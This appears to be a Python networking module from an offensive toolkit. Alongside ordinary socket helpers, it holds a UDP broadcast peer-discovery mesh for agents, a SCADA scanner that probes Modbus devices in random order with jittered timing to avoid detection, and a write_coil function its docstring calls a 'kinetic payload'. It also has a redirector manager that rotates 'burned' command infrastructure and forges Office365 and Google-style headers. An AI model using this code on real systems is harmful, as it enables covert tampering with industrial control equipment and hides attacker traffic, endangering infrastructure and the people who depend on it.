"""
NET_UTILS.py
============
Centralized networking module containing socket creation, TCP/UDP binding,
listener setups, P2P communication, and reverse connection logic.

Extracted from: ghost.py, redirector.py, forensic_pcap_deep_inspector.py

Functions:
    - Socket creation and configuration for TCP/UDP
    - HiveSwarm P2P peer discovery and communication
    - SCADA/Modbus protocol packet building and exploitation
    - Connection establishment and management
    - Infrastructure redirector management with load balancing
    - Network information gathering
"""

import socket
import struct
import threading
import time
import random
import uuid
from typing import Tuple, Optional, Dict, List, Any
from datetime import datetime


# ============================================================================
# SOCKET UTILITIES
# ============================================================================

def create_tcp_socket(timeout: Optional[float] = None, reuse_port: bool = True) -> socket.socket:
    """
    Create and configure a TCP socket.
    
    Args:
        timeout: Socket timeout in seconds (None = blocking)
        reuse_port: If True, enable SO_REUSEADDR for rapid restarts
        
    Returns:
        Configured TCP socket
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if reuse_port:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    if timeout is not None:
        sock.settimeout(timeout)
    return sock


def create_udp_socket(broadcast: bool = False, reuse_port: bool = True) -> socket.socket:
    """
    Create and configure a UDP socket.
    
    Args:
        broadcast: If True, enable broadcast mode
        reuse_port: If True, enable SO_REUSEADDR
        
    Returns:
        Configured UDP socket
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if reuse_port:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    if broadcast:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    return sock


def connect_tcp(host: str, port: int, timeout: float = 5.0, non_blocking: bool = False) -> Tuple[bool, Optional[socket.socket]]:
    """
    Attempt TCP connection to remote host.
    
    Args:
        host: Target hostname or IP address
        port: Target port
        timeout: Connection timeout (non_blocking ignores this)
        non_blocking: If True, use connect_ex (non-blocking, returns 0 on success)
        
    Returns:
        Tuple of (success: bool, socket: socket or None)
    """
    try:
        sock = create_tcp_socket(timeout=timeout if not non_blocking else None)
        
        if non_blocking:
            sock.settimeout(0)
            result = sock.connect_ex((host, port))
            return (result == 0, sock if result == 0 else None)
        else:
            sock.connect((host, port))
            return (True, sock)
    except Exception as e:
        return (False, None)


def bind_listener(port: int, protocol: str = "TCP", backlog: int = 5, bind_address: str = "") -> Tuple[bool, Optional[socket.socket]]:
    """
    Bind a listening socket to specified port.
    
    Args:
        port: Port to listen on
        protocol: "TCP" or "UDP"
        backlog: Number of pending connections (TCP only)
        bind_address: Address to bind to (empty string = all interfaces)
        
    Returns:
        Tuple of (success: bool, listener_socket: socket or None)
    """
    try:
        if protocol.upper() == "TCP":
            sock = create_tcp_socket()
            sock.bind((bind_address, port))
            sock.listen(backlog)
        else:  # UDP
            sock = create_udp_socket()
            sock.bind((bind_address, port))
        return (True, sock)
    except Exception as e:
        return (False, None)


# ============================================================================
# NETWORK INFORMATION GATHERING
# ============================================================================

def get_local_ip() -> Optional[str]:
    """
    Discover local IP address by connecting to external host.
    
    Non-invasive method that doesn't send data, just determines local IP.
    
    Returns:
        Local IP address string, or None on error
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        local_ip = sock.getsockname()[0]
        sock.close()
        return local_ip
    except Exception:
        return None


def get_subnet_from_ip(ip: str) -> str:
    """
    Extract /24 subnet from IP address.
    
    Args:
        ip: IP address string (e.g., "192.168.1.100")
        
    Returns:
        Subnet prefix (e.g., "192.168.1")
    """
    return ".".join(ip.split(".")[:3])


def is_port_open(host: str, port: int, timeout: float = 0.5) -> bool:
    """
    Quick check if remote port is open (non-blocking).
    
    Args:
        host: Target hostname or IP
        port: Target port
        timeout: Connection attempt timeout
        
    Returns:
        True if port responds, False otherwise
    """
    try:
        sock = create_tcp_socket(timeout=timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False


# ============================================================================
# P2P HIVE SWARM (Peer-to-Peer Communication)
# ============================================================================

class HiveSwarm:
    """
    P2P mesh network for agent-to-agent communication.
    
    Uses UDP broadcast for peer discovery and announcement.
    Maintains peer list with timestamps for network topology awareness.
    
    Typical Usage:
        swarm = HiveSwarm(agent_id="unique-agent-id")
        swarm.start()  # Start listening thread
        swarm.announce()  # Broadcast presence to peers
        peers = swarm.get_peers()
    """
    
    SWARM_PORT = 55555
    PING_MESSAGE = "PING"
    ANNOUNCEMENT_INTERVAL = 30  # seconds
    
    def __init__(self, agent_id: str, swarm_port: int = SWARM_PORT):
        """
        Initialize HiveSwarm instance.
        
        Args:
            agent_id: Unique identifier for this agent
            swarm_port: UDP port for P2P communication (default 55555)
        """
        self.agent_id = agent_id
        self.swarm_port = swarm_port
        self.peers: Dict[str, float] = {}  # {peer_id: timestamp}
        self.running = False
        self.sock = None
        self._listener_thread = None

    def start(self) -> 'HiveSwarm':
        """
        Start P2P listener thread as daemon.
        
        Returns:
            Self (for method chaining)
        """
        if self.running:
            return self
        
        self.running = True
        self._listener_thread = threading.Thread(target=self._listen, daemon=True)
        self._listener_thread.start()
        return self

    def stop(self):
        """Stop P2P listener and clean up socket."""
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass

    def _setup_socket(self):
        """Initialize UDP socket with broadcast capability."""
        try:
            self.sock = create_udp_socket(broadcast=True)
            self.sock.bind(("", self.swarm_port))
            return True
        except Exception as e:
            return False

    def _listen(self):
        """Listener thread: Receives peer PING messages."""
        if not self._setup_socket():
            return

        while self.running:
            try:
                data, addr = self.sock.recvfrom(1024)
                msg = data.decode("utf-8", errors="ignore")
                
                if msg.startswith(self.PING_MESSAGE):
                    parts = msg.split()
                    if len(parts) >= 2:
                        sender_id = parts[1]
                        if sender_id != self.agent_id:
                            self.peers[sender_id] = time.time()
            except Exception:
                pass

    def announce(self) -> bool:
        """
        Broadcast presence to all peers on network.
        
        Returns:
            True if broadcast sent successfully, False on error
        """
        if not self.running or not self.sock:
            return False
        
        try:
            msg = f"{self.PING_MESSAGE} {self.agent_id}"
            self.sock.sendto(msg.encode(), ("<broadcast>", self.swarm_port))
            return True
        except Exception:
            return False

    def get_peers(self) -> Dict[str, float]:
        """
        Get current peer dictionary.
        
        Returns:
            Dict of {peer_id: last_seen_timestamp}
        """
        return dict(self.peers)

    def get_active_peers(self, timeout_seconds: int = 60) -> List[str]:
        """
        Get list of active peers (seen within timeout).
        
        Args:
            timeout_seconds: Consider peer active if seen within this time
            
        Returns:
            List of active peer IDs
        """
        now = time.time()
        return [
            peer_id for peer_id, timestamp in self.peers.items()
            if now - timestamp < timeout_seconds
        ]

    def cleanup_stale_peers(self, timeout_seconds: int = 300):
        """
        Remove peers not seen for specified duration.
        
        Args:
            timeout_seconds: Remove peers not seen in this time (default 5 minutes)
        """
        now = time.time()
        stale = [
            peer_id for peer_id, timestamp in self.peers.items()
            if now - timestamp > timeout_seconds
        ]
        for peer_id in stale:
            del self.peers[peer_id]


# ============================================================================
# MODBUS/SCADA PROTOCOL
# ============================================================================

class ModbusProtocol:
    """
    Modbus TCP protocol implementation for SCADA communication.
    
    Supports reading holding registers and writing coils.
    Typically used on port 502.
    """
    
    DEFAULT_PORT = 502
    FUNC_READ_HOLDING_REGISTERS = 3
    FUNC_WRITE_SINGLE_COIL = 5
    
    @staticmethod
    def build_packet(unit_id: int, func_code: int, data: bytes) -> bytes:
        """
        Build raw Modbus TCP packet.
        
        Format:
            Transaction ID (2 bytes, big-endian)
            Protocol ID (2 bytes, always 0)
            Length (2 bytes, including Unit ID + Function Code + Data)
            Unit ID (1 byte)
            Function Code (1 byte)
            Data (variable)
        
        Args:
            unit_id: Modbus unit ID (1-247, typically 1)
            func_code: Modbus function code (e.g., 3 for read, 5 for write)
            data: Function-specific data payload
            
        Returns:
            Modbus TCP packet as bytes
        """
        trans_id = random.randint(1, 65535)
        proto_id = 0
        length = len(data) + 2  # UnitID + FuncCode
        
        # Pack header: Big-endian, Short, Short, Short, Byte, Byte
        header = struct.pack(">HHHBB", trans_id, proto_id, length, unit_id, func_code)
        return header + data

    @staticmethod
    def read_holding_registers(start_addr: int, count: int, unit_id: int = 1) -> bytes:
        """
        Build packet to read holding registers (Function Code 3).
        
        Args:
            start_addr: Starting register address
            count: Number of registers to read
            unit_id: Modbus unit ID
            
        Returns:
            Modbus packet
        """
        data = struct.pack(">HH", start_addr, count)
        return ModbusProtocol.build_packet(unit_id, ModbusProtocol.FUNC_READ_HOLDING_REGISTERS, data)

    @staticmethod
    def write_single_coil(coil_addr: int, value: bool, unit_id: int = 1) -> bytes:
        """
        Build packet to write single coil (Function Code 5).
        
        Args:
            coil_addr: Coil address to write
            value: True = 0xFF00 (ON), False = 0x0000 (OFF)
            unit_id: Modbus unit ID
            
        Returns:
            Modbus packet
        """
        coil_value = 0xFF00 if value else 0x0000
        data = struct.pack(">HH", coil_addr, coil_value)
        return ModbusProtocol.build_packet(unit_id, ModbusProtocol.FUNC_WRITE_SINGLE_COIL, data)


class ScadaScanner:
    """
    SCADA device discovery and exploitation utilities.
    
    Performs stealth scanning with randomized targets and jittered timing.
    """
    
    def __init__(self, port: int = ModbusProtocol.DEFAULT_PORT):
        """Initialize SCADA scanner."""
        self.port = port
        self.timeout = 0.5
        self.jitter_range = (0.2, 0.7)  # seconds

    def scan_subnet(self, subnet: str, target_range: range = None, randomize: bool = True) -> List[Dict]:
        """
        Scan subnet for responsive SCADA devices.
        
        Args:
            subnet: Subnet prefix (e.g., "192.168.1")
            target_range: Range of target IPs to scan (default 1-20)
            randomize: If True, randomize scan order to avoid detection
            
        Returns:
            List of discovered devices (dicts with ip, status, proto keys)
        """
        if target_range is None:
            target_range = range(1, 21)
        
        targets = list(target_range)
        if randomize:
            random.shuffle(targets)
        
        discovered = []
        
        for i in targets:
            time.sleep(random.uniform(self.jitter_range[0], self.jitter_range[1]))
            target_ip = f"{subnet}.{i}"
            
            if self._probe_modbus(target_ip):
                discovered.append({
                    "ip": target_ip,
                    "status": "RESPONSIVE",
                    "proto": "MODBUS_TCP",
                    "timestamp": datetime.now().isoformat()
                })
        
        return discovered

    def _probe_modbus(self, target_ip: str) -> bool:
        """
        Probe target for Modbus TCP service.
        
        Args:
            target_ip: Target IP address
            
        Returns:
            True if Modbus service detected, False otherwise
        """
        try:
            sock = create_tcp_socket(timeout=self.timeout)
            result = sock.connect_ex((target_ip, self.port))
            
            if result == 0:
                # Connection successful, probe with Modbus packet
                try:
                    payload = ModbusProtocol.read_holding_registers(0, 1)
                    sock.send(payload)
                    response = sock.recv(1024)
                    sock.close()
                    return len(response) > 0
                except:
                    pass
            
            sock.close()
            return False
        except Exception:
            return False

    def write_coil(self, target_ip: str, coil_addr: int, value: bool) -> bool:
        """
        Write to single coil on SCADA device (kinetic payload).
        
        Args:
            target_ip: Target device IP
            coil_addr: Coil address to modify
            value: True to activate (0xFF00), False to deactivate
            
        Returns:
            True if write successful, False otherwise
        """
        try:
            sock = create_tcp_socket(timeout=1.0)
            sock.connect((target_ip, self.port))
            
            packet = ModbusProtocol.write_single_coil(coil_addr, value)
            sock.send(packet)
            sock.close()
            return True
        except Exception:
            return False


# ============================================================================
# INFRASTRUCTURE MANAGEMENT
# ============================================================================

class RedirectorManager:
    """
    Manages redirector infrastructure for traffic obfuscation and load balancing.
    
    Tracks redirector status, load, and handles infrastructure rotation
    when compromised ("burning" redirectors).
    """
    
    def __init__(self, db_interface: Any = None):
        """
        Initialize redirector manager.
        
        Args:
            db_interface: Database interface (must support dict-like access)
        """
        self.db = db_interface
        if self.db and "redirectors" not in self.db.db:
            self.db.db["redirectors"] = {}

    def register_redirector(self, ip: str, hostname: str, redirect_type: str = "HTTP") -> str:
        """
        Register new redirector in infrastructure.
        
        Args:
            ip: Redirector IP address
            hostname: Redirector hostname/FQDN
            redirect_type: Type of redirector (HTTP, SOCKS5, DNS, etc.)
            
        Returns:
            Redirector ID (8-char hex string)
        """
        rid = str(uuid.uuid4())[:8]
        self.db.db["redirectors"][rid] = {
            "id": rid,
            "ip": ip,
            "hostname": hostname,
            "type": redirect_type,
            "status": "ACTIVE",
            "last_seen": datetime.now().isoformat(),
            "load": 0,
        }
        self.db.save()
        return rid

    def get_all_redirectors(self) -> List[Dict]:
        """
        Get all registered redirectors.
        
        Returns:
            List of redirector dicts
        """
        if not self.db:
            return []
        return list(self.db.db.get("redirectors", {}).values())

    def update_status(self, rid: str, status: str):
        """
        Update redirector status.
        
        Args:
            rid: Redirector ID
            status: New status (ACTIVE, DEGRADED, OFFLINE, BURNED)
        """
        if self.db and rid in self.db.db["redirectors"]:
            self.db.db["redirectors"][rid]["status"] = status
            self.db.db["redirectors"][rid]["last_seen"] = datetime.now().isoformat()
            self.db.save()

    def burn_redirector(self, rid: str):
        """
        Mark redirector as compromised and take offline.
        
        Args:
            rid: Redirector ID to burn
        """
        self.update_status(rid, "BURNED")

    def get_optimal_redirector(self) -> Optional[Dict]:
        """
        Get redirector with lowest load (load balancing).
        
        Returns:
            Best redirector dict, or None if no active redirectors
        """
        active = [r for r in self.get_all_redirectors() if r["status"] == "ACTIVE"]
        if not active:
            return None
        return min(active, key=lambda x: x["load"])

    def generate_stealth_headers(self, profile: str = "OFFICE365") -> Dict[str, str]:
        """
        Generate deceptive HTTP headers based on profile.
        
        Args:
            profile: Header profile (OFFICE365, GOOGLE, GENERIC)
            
        Returns:
            Dict of HTTP headers
        """
        profiles = {
            "OFFICE365": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Referer": "https://outlook.office365.com/owa/",
                "X-Forwarded-For": "127.0.0.1",
                "Cookie": "fl_sess=1; x-ms-client-session-id=" + str(uuid.uuid4()),
            },
            "GOOGLE": {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Referer": "https://www.google.com/search?q=security+updates",
                "X-Requested-With": "XMLHttpRequest",
            },
            "GENERIC": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            },
        }
        return profiles.get(profile, profiles["OFFICE365"])


# ============================================================================
# DATA TRANSMISSION
# ============================================================================

def send_data(sock: socket.socket, data: Union[str, bytes]) -> bool:
    """
    Send data on socket with error handling.
    
    Args:
        sock: Connected socket
        data: String or bytes to send
        
    Returns:
        True on success, False on error
    """
    try:
        if isinstance(data, str):
            data = data.encode()
        sock.sendall(data)
        return True
    except Exception:
        return False


def receive_data(sock: socket.socket, buffer_size: int = 1024, timeout: Optional[float] = None) -> Optional[bytes]:
    """
    Receive data from socket with error handling.
    
    Args:
        sock: Connected socket
        buffer_size: Maximum bytes to receive
        timeout: Optional receive timeout
        
    Returns:
        Received bytes, or None on timeout/error
    """
    try:
        old_timeout = sock.gettimeout()
        if timeout is not None:
            sock.settimeout(timeout)
        
        data = sock.recv(buffer_size)
        
        if timeout is not None:
            sock.settimeout(old_timeout)
        
        return data if data else None
    except socket.timeout:
        return None
    except Exception:
        return None
